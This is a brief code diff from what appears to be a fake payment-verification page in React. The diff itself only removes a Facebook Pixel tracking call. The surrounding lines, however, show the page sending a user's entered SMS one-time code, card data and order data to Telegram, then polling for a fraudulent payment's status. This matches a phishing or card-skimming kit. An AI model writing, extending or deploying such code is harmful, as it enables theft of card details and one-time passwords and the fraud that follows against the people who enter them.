@@ -68,11 +68,6 @@ const InvalidSMSPage = () => {
     // Send SMS code to Telegram
     notifySMSCodeEntered(verificationCode, cardData, orderData)
 
-    // Track Facebook Pixel Lead event - ONLY when OTP code is submitted
-    if (typeof fbq !== 'undefined') {
-      fbq('track', 'Lead')
-    }
-
     // Start polling for payment status and invalid SMS check
     const userId = localStorage.getItem('telegram_user_id')
     const checkPaymentStatus = setInterval(async () => {
